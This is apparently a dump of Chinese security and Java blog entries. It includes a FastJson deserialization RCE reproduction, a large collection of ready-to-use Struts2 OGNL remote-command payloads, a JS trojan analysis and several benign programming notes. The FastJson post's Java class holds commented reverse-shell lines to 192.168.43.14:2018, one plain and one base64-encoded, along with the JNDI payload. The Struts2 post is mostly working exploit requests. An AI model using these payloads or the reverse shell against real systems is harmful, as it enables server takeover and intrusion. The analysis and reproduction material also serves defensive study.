    <content type="text"><![CDATA[在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。 影响版本1.2.24以及之前版本（2017.1） 复现方法很多，这里直接用https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE的方法。 修改 CommandObject.java1234567891011121314151617181920import java.lang.Runtime;import java.lang.Process;public class CommandObject &#123; public CommandObject()&#123; try&#123; Runtime rt = Runtime.getRuntime(); //Runtime.getRuntime().exec("/bin/bash -i &gt;&amp;/dev/tcp/192.168.43.14/2018&lt;&amp;1"); //String[] commands = &#123;"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"&#125;; String[] commands = &#123;"touch","/opt/test"&#125;; //Command Process pc = rt.exec(commands); pc.waitFor(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void main(String[] argv)&#123; CommandObject e = new CommandObject(); &#125;&#125; 编译 CommandObject.java1javac CommandObject.java 开启HTTP服务1python -m SimpleHTTPServer 80 开启RMIServer1java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar ip port 发送payload1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:port/Object&quot;,&quot;autoCommit&quot;:true&#125; 其他参考链接 http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/ https://github.com/shengqi158/fastjson-remote-code-execute-poc https://github.com/vulhub/vulhub/tree/master/fastjson/vuln https://lazydog.me/post/fastjson-JdbcRowSetImpl-rce-exploit.html https://www.cnblogs.com/hac425/p/9800288.html https://www.restran.net/2018/10/29/fastjson-rce-notes/ http://blog.nsfocus.net/fastjson-rce-poc/]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot无需配置文件上传]]></title>
    <url>%2F%2Fblog%2F1547519250524.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;之前有个需求就是拦截上传请求，但是框架用的是SpringBoot。所以常规的拦截方法调用Apache Commons FileUpload无法成功。SpringBoot中有默认的文件上传组件，在使用ServletFileUpload时需要关闭Spring Boot的默认配置 ，所以在配置文件中添加 1spring.http.multipart.enabled=false &emsp;&emsp;这样虽然调用成功，但是又影响正常的上传功能。使用SpringBoot默认的文件上传组件，又需要更改配置文件，否则各种报错。但是这个拦截的需求是放在通用的拦截器上，可以配置不同的系统。所以还是不行。&emsp;&emsp;最后在网上找了好久，东拼西凑，看了各种源码终于找到了一种方法可以无需配置文件就可以获得上传请求时的各种参数，遂记录之。123456789try &#123; HttpServletRequest request1 = (HttpServletRequest) request; CommonsMultipartResolver CommonsMultipartResolver = new CommonsMultipartResolver(request1.getSession().getServletContext()); MultipartResolver resolver = CommonsMultipartResolver; MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request1); Collection&lt;Part&gt; parts = multipartRequest.getParts(); for (Part part: parts) &#123; String filename=part.getSubmittedFileName(); &#125; &emsp;&emsp;使用的是Spring框架自己的上传组件，最后成功获得上传文件名等参数。]]></content>
      <categories>
        <category>编程记录</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
        <tag>上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[idea打包jar报Error: Invalid or corrupt jarfile]]></title>
    <url>%2F%2Fblog%2F1539757907171.html</url>
    <content type="text"><![CDATA[用idea将springboot web项目打包成 jar包的时候,百度了几遍文章，也按照文章做了，最后也生成了Jar包，但是最后运行的时候，却报错：1Error: Invalid or corrupt jarfile XX.jar 最后也解决了，下面就在复现一下，记下自己容易疏忽的步骤。 1、选择 File -&gt; Project Structure 2、选择 Artifacts-&gt;JAR-&gt;From modules with dependencies 3、选择启动类选择 copy to the output directory and link via manifest-&gt;OK最重要的是 META-INF 默认放到 src\main\java 目录里，如果使用默认值，没有进行其他配置，生成的 jar 有可能不会包含 META-INF 目录，导致运行 jar 出错 。 所以，META-INF要放在src\main\resources 目录下。这也是报Error: Invalid or corrupt jarfile的原因。 4、查看或者修改生成的Jar包名字和路径 5、选择Build -&gt; Build Artifacts 然后 build 即可 6、最后在项目的目录里会生出对应的Jar包 7、进到对应的目录，执行命令即可1java -jar xx.jar]]></content>
      <categories>
        <category>解决报错</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2历史漏洞POC]]></title>
    <url>%2F%2Fblog%2F1533106712367.html</url>
    <content type="text"><![CDATA[每次看Struts2历史漏洞POC都要去百度，有点麻烦。所以收集了网上的POC放在一起，查阅比较方便。 S2-005POST 1(&apos;\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\43context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\75false&apos;)(b))&amp;(&apos;\43c&apos;)((&apos;\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\43mycmd\75\&apos;netstat -an \&apos;&apos;)(d))&amp;(h)((&apos;\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)&apos;)(d))&amp;(i)((&apos;\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\43myres\75new\40byte[51020]&apos;)(d))&amp;(k)((&apos;\43mydat.readFully(\43myres)&apos;)(d))&amp;(l)((&apos;\43mystr\75new\40java.lang.String(\43myres)&apos;)(d))&amp;(m)((&apos;\43myout\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\43myout.getWriter().println(\43mystr)&apos;)(d)) S2-009GET 1name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27netstat%20-an%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)] S2-013POST 1a=1$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;netstat -an&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())&#125; S2-016GET 1?redirect:$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&apos;com.opensymphony.xwork2.dispatcher.HttpServletResponse&apos;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125; S2-019POST 1debug=command&amp;expression=#f=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;netstat&apos;,&apos;-an&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close() S2-032GET 1?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;cmd=netstat%20-an&amp;pp=____A&amp;ppp=%20&amp;encoding=UTF-8 S2-033GET 1/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=netstat%20-an S2-037GET 1/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=16456&amp;command=netstat%20-an S2-045HEADER 1&quot;Content-Type&quot;:&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat -an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot; S2-046POST （FILE） 1234uploadexp = &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;netstat -an&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x000&quot; files =&#123;&quot;test&quot;:(uploadexp, &quot;text/plain&quot;)&#125;req = requests.post(self.url, files=files,) S2-048POST 123456789POST /S2-048/integration/saveGangster.action HTTP/1.1Host: 192.168.159.146:8080Connection: closeAccept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50Content-Type: application/x-www-form-urlencodedContent-Length: 1217age=1&amp;__checkbox_bustedBefore=true&amp;name=name%3D%25%7B%28%23nike%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat+-an%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&amp;description=1 S2-052POST 1234567891011121314POST /S2-052/orders/3/ HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/xmlContent-Length: 1616Referer: http://127.0.0.1:8080/orders/3/editCookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7Connection: closeUpgrade-Insecure-Requests: 1&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;whoami&lt;/string&gt;&lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; S2-053GET 1?name=%25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23cmd%3d%27netstat+-an%27).(%23iswin%3d(%40java.lang.System%40getProperty(%27os.name%27).toLowerCase().contains(%27win%27))).(%23cmds%3d(%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d)).(%23p%3dnew+java.lang.ProcessBuilder(%23cmds)).(%23p.redirectErrorStream(true)).(%23process%3d%23p.start()).(%40org.apache.commons.io.IOUtils%40toString(%23process.getInputStream()))%7d S2-057URL12345678检测/$%7B233*233%7D/actionChain1.action2.3.20 版本/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action2.3.34 版本/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action S2-devmodeGET 1234567?debug=browser&amp;object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;command=netstat%20-andebug=command&amp;expression=%28%23parameters%29debug=command&amp;expression=%28%23application%29debug=command&amp;expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=7f604dbaced33b7d9c2d5e1212eba16e ​]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞</tag>
        <tag>POC</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java代码审计相关文章（长期更新）]]></title>
    <url>%2F%2Fblog%2F1521424233278.html</url>
    <content type="text"><![CDATA[Java代码审计相关文章 Java代码审计学习 JAVA代码审计的一些Tips(附脚本) 补天沙龙南京站—Java代码审计PPT ​ 攻击JavaWeb应用[1]-JavaEE 基础 攻击JavaWeb应用[2]-CS交互安全 攻击JavaWeb应用[3]-SQL注入[1] 攻击JavaWeb应用[4]-SQL注入[2] 攻击JavaWeb应用[5]-MVC安全 攻击JavaWeb应用[6]-程序架构与代码审计 攻击JavaWeb应用[7]-Server篇[1] 攻击JavaWeb应用[8]-后门篇 [代码审计] Java代码审计连载之—添油加醋 深入理解 JAVA 反序列化漏洞 Java代码审计基础(一) javaweb的常见web漏洞 谈一谈java代码审计—安全小课堂第四十一期 Java代码审计之文件包含 Java代码审计实际案例 某租车系统JAVA代码审计 Java代码审计-铁人下载系统 铁人下载系统代码审计 Java EE代码审计实例及漏洞修复 JAVA代码审计之团队CMS v1.0 某 Java 急速开发框架分析与挖掘 精品漏洞第4弹——层层放大java审计的攻击面 JEECMS|JEEBBS|JSPGOU 前台getshell(高危) Live800在线客服系统SQL注射/未授权查看对话记录 Live800在线客服系统默认密码导致的SQL查询/SQL注射漏洞 live800客服系统任意文件下载漏洞 live800在线客服系统SQL注射漏洞 Enorth Webpublisher CMS SQL Injection from delete_pending_news.jsp ​]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux虚拟机使用主机shadowsocks代理上网]]></title>
    <url>%2F%2Fblog%2F1520349399715.html</url>
    <content type="text"><![CDATA[无意中发现虚拟机也能通过shadowsocks代理上网，而且非常方便，尝试了一波 0x01 查看本机IPipconfig,找到主机的IP我这里使用的wifi，所以显示的是局域网地址，总之，能ping通就行。 0x02 查看SS本地端口接下来就是连上SS，然后查看本地端口（默认是1080），我这里是1081 0x03 允许SS来自局域网的连接 0x04 虚拟机设成NAT模式 0x05 进入系统设置代理 0x06 成功代理 参考链接 http://blog.csdn.net/zzl1243976730/article/details/63695131 http://blog.csdn.net/u010726042/article/details/53187937]]></content>
      <categories>
        <category>日常姿势</category>
      </categories>
      <tags>
        <tag>日常</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次JS木马分析]]></title>
    <url>%2F%2Fblog%2F1514542114971.html</url>
    <content type="text"><![CDATA[0x00 前言 随着 javascript 这类脚本语言的快速发展，它能展现的内容越来越多样，所运用的功能变得越来越强大。当运用在 web 开发上时，增加了更多的动态功能和效果，极大的改善了用户体验。但是，随着 js 的功能强大的同时，也带来了更多的安全隐患。由于 js 的混淆效果多样，常见的有 YUI Compressor、Google Closure Compiler、UglifyJS。更有 jsfuck 这种比较奇葩的加密方式。使得让软件自动的识别特征码，查杀 js 恶意代码变的非常困难。对 JavaScript 恶意代码的检测已成为 Web 信息安全领域一个亟待解决的问题。 因为近期偶然发现一个 js 木马文件，所以想探寻一下 js 木马的混淆方法和这个木马起的作用。 0x01 解混淆 首先打开 js 文件，看到的就是一个很明显的 var PAa = &quot;&quot;; 定义了一个变量，然后是大段的代码： 这大段的代码都是以函数执行的方式放在数组里的，我们在仔细看一下数组第一个元素： 1(function f000()&#123;return &quot;Sq&quot;;&#125;)() 发现，这数组的第一个元素其实就是字符串 Sq,但是是以函数执行后返回的结果显示的，其他数组元素也是这样的。非常的巧妙，等于加了一层壳，防止被跟踪查杀。 接着我们看到最后： 发现，又定义了一个字典，然后对中间数组元素进行对照替换处理，得到真正的字符，而且这个字符也不是真正的字符，而是以 16 进制的形式表示的。然后拼接到开始定义的 PAa 这个变量中，最后 eval 执行这段代码，那毫无疑问，最后 PAa 这个变量存储的东西就是真正的代码了。 在这里，就可以用 document.write() 来直接输出 PAa 这个变量的内容，也就是明文代码了。 这第一层的混淆，相当于对代码进行”加壳”处理，通过函数，数组，字典、16进制等方式进行层层替换，最后才得出代码。 0x02 代码分析 对于输出的代码，在进行美化和调整一下格式，终于达到人能理解的程度了。但是代码还是有第二层的混淆，不过这层的混淆就是些字符串的拼接与组合，已达到骗过机器追踪关键字的目的，从而达到免杀的效果。但对人来说，还是可以判断分析出来的： 下面就来分析一下，这个木马到底做了哪些操作。 判断cmd.exe的路径 代码开始就是执行了一个函数： 可以看到，在这里也是对字符进行拼接，最后凑出来的关键字。 这个函数的大概意思就是通过创建 WScript.Shell 对象来查看环境变量中的 COMSPEC 值，这个值是返回命令行解释器可执行程序的准确路径，就是 cmd.exe 的路径。然后与系统目录下的 system32\cmd.exe 进行比较。判断 cmd.exe 的路径。 扩展与查看环境变量 这里，也是经过一连串的字符的替换与拼接，大致还原出原来的样子 123Za3 + OHb + PVg7 + Tp7 + QRn4 表示 CreateObjectOEl7 + Pa + Eu 表示 WScript.ShellJs9 + Vh + PVx + COb3 表示 %TEMP%/ 这里的意思就是通过扩充环境字串 %TEMP%/，并在该目录下，创建出一串无意义名字的后缀为 dll 的字符串，即 xx.dll 赋值于 GLq 这个变量中，为后面的写文件做铺垫，继续看下去： 接下来，就是查看环境变量中的 PROCESSOR_ARCHITECTUREiD，来判断系统是 64，还是 32 位，最后选择相对应的 rundll32.exe，用于后面执行恶意动态链接库的函数。其中 123Cc5 + TXr9 + HUf + YEn7 + Ci5 + SDb9 表示 PROCESSOR_ARCHITECTUREVg 表示 &quot;%SystemRoot%\\system32\\rundll32.exe&quot; + &quot;&quot;ZPt 表示 &quot;%SystemRoot%\\SysWOW64\\rundll32.exe&quot; + &quot;&quot; 下载恶意文件 创建 http 请求对象，其中 1Zm6 表示 [MSXML2.XMLHTTP,WinHttp.WinHttpRequest.5.1] 这 2 个都是能实现 HTTP 请求响应的组件，这里是尝试创建这其中任意一个组件对象。 紧接着，就是判断在 %TEMP%/ 是否已有 xx.dll ，即是否已经被攻击，如果没有的话，就继续执行下去，也就是访问恶意网站，下载要在计算机上执行的恶意文件，并放在 %TEMP%/ 目录下的临时文件中,当然文本也是加密处理的: 解密并校验恶意文件 存放临时文件后，因为文件内容也是经过混淆处理的，所以要重新从文件中取出内容进行处理与校验。我们来看下关键函数 IGi2 函数。 可以看到，主要的方法就是通过字符的 unicode 编码，针对恶意文本的一些特定字符的 unicode 编码进行替换。但是还没完，还有一个步骤： 对所有的数字进行异或运算。在最后，还要通过一系列特定的计算，与后四位的标志位进行比较，进行文本内容的校验，来判断该文本是否被修改，或者是内容不全。 之后，还加上了一层保险，就是判断整个恶意文件的字符数，保证是在一定的区间内。 执行恶意文件代码 最后，在判断过字符个数，没问题之后，就直接写入 dll 文件，准备执行了，如上图。 但是我们知道，要写入文本的字符串现在还都是 unicode 编码的，所以需要还原成真正的字符串才行，这里是通过 St 函数。而这个 St 函数和上面的 IGi2 函数的作用是一样的，只不过数组是反的，这也是我疑惑的地方，它的作用就是把之前替换掉的数字替换回来，然后进行全部的 unicode 解码，变成字符串。至于为什么要把替换掉的字符换回来？由于恶意网站已无法访问，所以拿不到下载的恶意文本，是注释？还是另一层混淆？这点就无法判断了，也是非常的遗憾。 在写入文件之后，就通过命令 Rundll32.exe DLLname,Functionname [Arguments] 的形式运行 dll 文件里的函数了。 0x03 免杀方式总结 js 的混淆能力真的很强大，简单总结一下上面木马的混淆免杀方式，第一层混淆就是通过了函数返回值，数组，字典、16 进制表示字符等方式进行层层替换，得到真正的代码。第二层混淆就是在代码执行过程中对关键字进行字符串的拼接，躲避对关键字的查杀，简单而有效。第三层混淆就是通过 unicode 编码，利用特定数值替换，然后通过异或等数学方法得到代码明文，对下载的恶意文件中的字符进行解密操作。整个过程体现了对普通杀毒软件的极强的欺骗性和防御性。 0x04 后记 由于找不到下载到本地的恶意代码文本，特意到网上搜了N个该 JS 的特征代码。最后终于发现了在国外的一个网站上发现了对类似 JS 执行的内存和行为分析，虽然还是没有下载的恶意代码文本，但是已经能够大致确定该 JS下载的恶意代码的作用了。地址 https://www.hybrid-analysis.com/sample/d8f738474e7c4251132059375b3716fdf21e87823f5890a918dfb70a4d164066?environmentId=100 从上面找到了 JS 代码，发现和我们分析的样本的第一层混淆方式略有不同: 但是同样经过了最开始的还原之后，发现核心代码和分析样本代码基本一致: 最后来看下，该 JS 下载的恶意代码究竟干了什么: 大概意思就是该恶意文件会从本地浏览器窃取信息，如平时让浏览器记住的账号密码，然后查找电脑账户名称，计算机名，计算机组名ID等。 也可以从行为分析的角度再次验证 JS 执行过程，因为上面是从代码角度分析的，难免有点点抽象，从 JS 实际操作过程分析，会更加的直观。我们可以看到： 发现与分析基本一致。]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>木马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos搭建Weblogic容器]]></title>
    <url>%2F%2Fblog%2F1511748171281.html</url>
